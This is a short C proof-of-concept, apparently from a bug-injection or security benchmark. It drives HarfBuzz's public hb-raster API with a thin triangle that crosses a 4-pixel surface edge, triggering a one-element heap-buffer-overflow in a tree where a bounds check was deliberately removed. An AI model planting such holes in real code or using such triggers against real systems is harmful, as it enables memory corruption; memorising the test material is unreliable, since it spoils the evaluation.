/* PoC: delocalized heap-buffer-overflow in HarfBuzz hb-raster edge sweep.
 *
 * Reached entirely through the public hb-raster API with in-contract
 * input:
 *   - hb_raster_draw_set_extents() fixes a small surface (width 4), so
 *     accumulated outline geometry can legitimately extend past the
 *     surface's right edge.
 *   - geometry is fed through the public hb_draw_funcs_t obtained from
 *     hb_raster_draw_get_funcs(), exactly as hb-view / hb-raster do.
 *   - hb_raster_draw_render() rasterizes it.
 *
 * On the shipped (modified) tree the clipped column walk hands the
 * boundary column (== width) to cell_add(), whose surface-width bounds
 * branch was removed, so row_area[width]/row_cover[width] are written
 * one element past the per-row accumulators -> ASan heap-buffer-overflow.
 *
 * On the original batch (and on the base) cell_add() still drops the
 * out-of-range column, so nothing fires.
 */

#include <hb.h>
#include <hb-raster.h>

int main (void)
{
  hb_raster_draw_t *rdr = hb_raster_draw_create_or_fail ();
  if (!rdr) return 2;

  /* Fixed 4x3 surface at the origin.  Columns 0..3 are on-surface. */
  hb_raster_extents_t ext;
  ext.x_origin = 0;
  ext.y_origin = 0;
  ext.width    = 4;
  ext.height   = 3;
  ext.stride   = 0; /* auto */
  hb_raster_draw_set_extents (rdr, &ext);

  hb_draw_funcs_t *df = hb_raster_draw_get_funcs (rdr);
  hb_draw_state_t  st = HB_DRAW_STATE_DEFAULT;

  /* A thin triangle.  The first edge runs left-to-right from pixel
   * column 1 (on-surface) to column 4 (one past the right edge) within
   * pixel row 0, so the edge sweep takes its clipped slow path and the
   * boundary cell lands at column == width. */
  hb_draw_move_to    (df, rdr, &st, 1.0f, 0.0f);
  hb_draw_line_to    (df, rdr, &st, 4.5f, 1.0f);
  hb_draw_line_to    (df, rdr, &st, 1.0f, 2.0f);
  hb_draw_close_path (df, rdr, &st);

  hb_raster_image_t *img = hb_raster_draw_render (rdr);

  hb_raster_image_destroy (img);
  hb_raster_draw_destroy (rdr);
  return 0;
}
